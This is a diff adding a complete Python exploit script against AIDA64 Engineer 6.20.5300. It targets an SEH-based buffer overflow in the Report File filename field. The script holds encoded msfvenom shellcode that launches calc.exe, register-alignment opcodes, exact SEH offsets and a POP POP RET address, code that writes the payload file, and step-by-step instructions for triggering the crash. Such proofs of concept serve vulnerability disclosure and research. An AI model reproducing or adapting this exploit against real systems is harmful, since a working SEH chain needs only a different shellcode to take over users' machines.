@@ -1,0 +1,120 @@
+# Exploit Title: AIDA64 Engineer 6.20.5300 - 'Report File' filename Buffer Overflow (SEH)
+# Date: 2020-04-02
+# Exploit Author: Hodorsec
+# Version: v6.20.5300
+# Software Link: http://download.aida64.com/aida64engineer620.exe
+# Vendor Homepage: https://www.aida64.com/products/aida64-engineer
+# Tested on: Win7 x86 SP1 - Build 7601
+
+# Description:      
+# - Exploits the "Report File" buffer when sending an e-mail report via the Report wizard. Entering an overly long string, results in a crash which overwrites SEH.
+
+# Reproduction:
+# - Use indicated OS or manipulate settings: your mileage may vary due to different offsets on other Windows versions / SP's.
+# - Run the script, a TXT file will be generated
+# - On the Windows machine, open the TXT file in Wordpad. Copy the contents to clipboard (ctrl+c)
+# - Open AIDA64 Engineer
+# - First, click on "File", "Preferences"
+# - Click menu "Report", "Report File"
+# - Enter a long string in the field "File name"
+# - Set "File extension" to automatic, as by default
+# - Click OK
+# - Second, in the main menu, click "Report" which shows the "Report Wizard"
+# - Next, "System Summary only", next, "Plain Text", Finish
+# - Click the button "Send In E-mail"
+# - Check results
+
+# WinDBG initial crash output using only A's:
+# (994.998): Access violation - code c0000005 (!!! second chance !!!)
+# eax=03ac1048 ebx=03ac100c ecx=03ac109c edx=77f070f4 esi=03ac1140 edi=00000000
+# eip=77f133a8 esp=03ac0fc8 ebp=03ac1000 iopl=0         nv up ei pl nz ac po nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212
+# ntdll!RtlAcquireSRWLockShared+0x1a:
+# 77f133a8 8365f400        and     dword ptr [ebp-0Ch],0 ss:0023:03ac0ff4=????????
+
+#!/usr/bin/python
+import sys,struct
+
+filename = "aida64_engineer_poc.txt"
+
+# Maximum length
+maxlen = 5000
+
+# Shellcode, using alphanum chars due to bytes considered to be bad above \x7f
+# msfvenom -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f c -b '\x00\x0a\x0d' bufferregister=eax
+# Payload size: 440 bytes
+shellcode = (
+"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
+"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
+"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
+"\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x49\x78\x6d\x52\x33\x30"
+"\x45\x50\x45\x50\x53\x50\x6b\x39\x6d\x35\x36\x51\x49\x50\x43"
+"\x54\x6e\x6b\x52\x70\x54\x70\x6c\x4b\x51\x42\x66\x6c\x4c\x4b"
+"\x62\x72\x52\x34\x6e\x6b\x54\x32\x46\x48\x54\x4f\x6d\x67\x52"
+"\x6a\x57\x56\x36\x51\x6b\x4f\x4e\x4c\x47\x4c\x31\x71\x71\x6c"
+"\x53\x32\x36\x4c\x37\x50\x5a\x61\x6a\x6f\x54\x4d\x77\x71\x5a"
+"\x67\x7a\x42\x38\x72\x70\x52\x46\x37\x4e\x6b\x53\x62\x52\x30"
+"\x6c\x4b\x52\x6a\x47\x4c\x4c\x4b\x50\x4c\x67\x61\x51\x68\x78"
+"\x63\x43\x78\x56\x61\x4a\x71\x53\x61\x6c\x4b\x33\x69\x55\x70"
+"\x37\x71\x6a\x73\x4c\x4b\x43\x79\x72\x38\x49\x73\x46\x5a\x32"
+"\x69\x4c\x4b\x44\x74\x6e\x6b\x67\x71\x58\x56\x54\x71\x6b\x4f"
+"\x6e\x4c\x49\x51\x78\x4f\x44\x4d\x63\x31\x68\x47\x30\x38\x79"
+"\x70\x30\x75\x68\x76\x43\x33\x51\x6d\x69\x68\x75\x6b\x61\x6d"
+"\x74\x64\x44\x35\x78\x64\x52\x78\x6c\x4b\x73\x68\x74\x64\x57"
+"\x71\x68\x53\x31\x76\x4c\x4b\x46\x6c\x32\x6b\x6e\x6b\x76\x38"
+"\x47\x6c\x43\x31\x6b\x63\x6c\x4b\x33\x34\x6e\x6b\x46\x61\x38"
+"\x50\x4c\x49\x77\x34\x31\x34\x61\x34\x43\x6b\x71\x4b\x53\x51"
+"\x42\x79\x33\x6a\x62\x71\x6b\x4f\x4b\x50\x53\x6f\x61\x4f\x52"
+"\x7a\x4c\x4b\x62\x32\x68\x6b\x6c\x4d\x33\x6d\x51\x7a\x37\x71"
+"\x4e\x6d\x4d\x55\x38\x32\x75\x50\x77\x70\x63\x30\x50\x50\x55"
+"\x38\x66\x51\x6e\x6b\x62\x4f\x6c\x47\x39\x6f\x59\x45\x4f\x4b"
+"\x78\x70\x58\x35\x49\x32\x52\x76\x53\x58\x4c\x66\x6c\x55\x6d"
+"\x6d\x4d\x4d\x79\x6f\x59\x45\x65\x6c\x46\x66\x51\x6c\x64\x4a"
+"\x4f\x70\x39\x6b\x59\x70\x64\x35\x47\x75\x6d\x6b\x73\x77\x66"
+"\x73\x42\x52\x42\x4f\x62\x4a\x75\x50\x31\x43\x59\x6f\x5a\x75"
+"\x51\x73\x33\x51\x62\x4c\x55\x33\x46\x4e\x70\x65\x70\x78\x53"
+"\x55\x65\x50\x41\x41"
+)
+
+# Align the registers
+# ESI = 04aaefc0, Buffer = 04abfb6c. Buffer - ESI = 0x010b8d
+align_eax = (
+                "\x56"                      # PUSH ESI
+                "\x58"                      # POP EAX
+                "\x66\x05\x3f\x10"          # ADD AX,0x103f # EAX = 0x04aaffff
+                "\x40"                      # INC EAX       # EAX = 0x04ab0000
+                "\x66\x05\x01\x7F"          # ADD AX,0x7f01 # EAX = 0x04ab7f01
+                "\x66\x05\x6b\x7c"          # ADD AX,0x7c6b # EAX = 0x04abfb6c
+                "\x50"                      # PUSH EAX
+)
+
+# Offsets
+crash_ebp = 307
+crash_esi = 1583
+crash_seh = 319
+crash_nseh = crash_seh - 4
+
+# Variables
+ascii_nop = "\x47"                                              # Doesn't do anything particular for this program
+nops = ascii_nop * 32                                           # ASCII NOP's amount
+
+# Prefix
+prefix = "A" * crash_nseh
+nseh = "\x71\x06\x70\x04"                                       # JNO SHORT # JO SHORT # Jump over NSEH/SEH
+seh = struct.pack("<L", 0x0121076e)                             # POP POP RET   # aida64.exe
+suffix = align_eax                                              # Align registers to execute shellcode
+suffix += nops                                                  # Some ASCII friendly NOP's
+suffix += shellcode                                             # Magic!
+suffix += "D" * (maxlen - len(prefix + nseh + seh + suffix))    # Filler
+
+# Concatenate string for payload
+payload = prefix + nseh + seh + suffix                          # Put it all together
+
+try:
+    file = open(filename,"wb")
+    file.write(payload)
+    file.close()
+    print "[+] File " + filename + " with size " + str(len(payload)) + " created successfully"
+except:
+    print "[!] Error creating file!"
+    sys.exit(0)
